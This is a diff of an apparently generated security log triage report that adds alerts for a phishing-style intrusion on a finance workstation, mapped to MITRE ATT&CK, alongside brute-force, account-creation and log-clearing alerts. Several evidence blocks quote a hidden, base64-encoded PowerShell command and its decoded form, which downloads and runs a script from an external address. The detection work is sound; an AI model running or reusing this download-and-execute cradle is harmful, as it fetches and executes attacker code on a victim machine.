@@ -1,27 +1,31 @@
 # Log triage report
 
-Generated from 76 security events in: `sample_logs/auth.log`, `sample_logs/windows_security.jsonl`
+Generated from 85 security events in: `sample_logs/auth.log`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`
 
 | Severity | Alerts |
 |---|---|
 | critical | 3 |
-| high | 3 |
-| medium | 4 |
+| high | 7 |
+| medium | 6 |
 | low | 0 |
 
 ## MITRE ATT&CK coverage
 
 | Technique | Name | Alerts |
 |---|---|---|
-| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | 1 |
-| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | 1 |
+| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | 2 |
+| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | 2 |
 | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Windows Event Logs | 1 |
+| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | 1 |
 | [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | 1 |
 | [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | 2 |
+| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | 3 |
 | [T1110](https://attack.mitre.org/techniques/T1110/) | Brute Force | 1 |
 | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | 2 |
 | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | 1 |
 | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | 4 |
+| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | 4 |
+| [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | 2 |
 
 ## Alerts
 
@@ -116,7 +120,47 @@ Nov 10 04:18:41 web01 sshd[41329]: Failed password for invalid user support from
 
 </details>
 
-### 5. [HIGH] Encoded PowerShell command (EXEC-001)
+### 5. [HIGH] Executable or script written by Office application (FILE-001)
+
+- **Time:** 2026-11-10 09:13:54 to 2026-11-10 09:13:54 UTC (1 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1105 Ingress Tool Transfer, T1204.002 User Execution: Malicious File
+
+winword.exe wrote C:\Users\thandi\AppData\Local\Temp\~invoice.vbs. Hash the file and check whether it was executed.
+
+<details><summary>Evidence</summary>
+
+```
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\~invoice.vbs", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:13:54.000"}
+```
+
+</details>
+
+### 6. [HIGH] Encoded PowerShell command (EXEC-001)
+
+- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information
+
+PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.
+
+Decoded command:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
+```
+
+<details><summary>Evidence</summary>
+
+```
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
+```
+
+</details>
+
+### 7. [HIGH] Encoded PowerShell command (EXEC-001)
 
 - **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -139,7 +183,41 @@ IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 
 </details>
 
-### 6. [HIGH] Security event log cleared (EVADE-001)
+### 8. [HIGH] Office application spawned a shell or script host (EXEC-002)
+
+- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment
+
+winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.
+
+<details><summary>Evidence</summary>
+
+```
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
+```
+
+</details>
+
+### 9. [HIGH] Office application spawned a shell or script host (EXEC-002)
+
+- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment
+
+winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.
+
+<details><summary>Evidence</summary>
+
+```
+{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
+```
+
+</details>
+
+### 10. [HIGH] Security event log cleared (EVADE-001)
 
 - **Time:** 2026-11-10 09:55:00 to 2026-11-10 09:55:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -156,7 +234,7 @@ Security log on WS-FIN-07.corp.example was cleared by thandi. Attackers do this 
 
 </details>
 
-### 7. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 11. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:46 UTC (24 events)
 - **Host:** `web01`
@@ -184,7 +262,7 @@ Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 po
 
 </details>
 
-### 8. [MEDIUM] Local account created (ACCT-001)
+### 12. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:18:55 UTC (1 events)
 - **Host:** `web01`
@@ -201,7 +279,43 @@ Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1
 
 </details>
 
-### 9. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 13. [MEDIUM] Script host connected to external address (NET-001)
+
+- **Time:** 2026-11-10 09:14:06 to 2026-11-10 09:14:18 UTC (3 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1105 Ingress Tool Transfer, T1071.001 Application Layer Protocol: Web Protocols
+
+powershell.exe on WS-FIN-07.corp.example connected to 198.51.100.23:80 3 time(s). Check the process command line and what was downloaded.
+
+<details><summary>Evidence</summary>
+
+```
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:06.000"}
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:12.000"}
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:18.000"}
+```
+
+</details>
+
+### 14. [MEDIUM] Executable or script written by script host (FILE-001)
+
+- **Time:** 2026-11-10 09:14:30 to 2026-11-10 09:14:30 UTC (1 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1105 Ingress Tool Transfer, T1204.002 User Execution: Malicious File
+
+powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the file and check whether it was executed.
+
+<details><summary>Evidence</summary>
+
+```
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\update.exe", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:30.000"}
+```
+
+</details>
+
+### 15. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 09:30:00 to 2026-11-10 09:32:48 UTC (15 events)
 - **Host:** `JUMP01.corp.example`
@@ -229,7 +343,7 @@ Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1
 
 </details>
 
-### 10. [MEDIUM] Local account created (ACCT-001)
+### 16. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:41:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
